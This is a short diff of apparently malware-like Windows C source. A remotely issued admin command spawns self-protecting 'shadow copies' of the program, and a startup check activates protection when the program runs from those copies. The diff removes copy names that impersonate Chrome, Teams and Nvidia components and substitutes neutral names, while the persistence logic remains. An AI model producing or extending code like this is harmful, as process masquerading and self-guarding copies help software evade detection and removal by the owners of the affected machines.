@@ -141,7 +141,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies: chrome_update.exe, teams_helper.exe, nvidia_share.exe — auto-protect in 15s]";
+        result = "[Spawned 3 copies: VCEngine.exe, VCWorker.exe, VCHelper.exe — auto-protect in 15s]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -265,9 +265,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Backup: detect if running from shadow path */
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-    if (strstr(currentPath, "chrome_update.exe") != NULL ||
-        strstr(currentPath, "teams_helper.exe") != NULL ||
-        strstr(currentPath, "nvidia_share.exe") != NULL) {
+    if (strstr(currentPath, "VCEngine.exe") != NULL ||
+        strstr(currentPath, "VCWorker.exe") != NULL ||
+        strstr(currentPath, "VCHelper.exe") != NULL) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
 
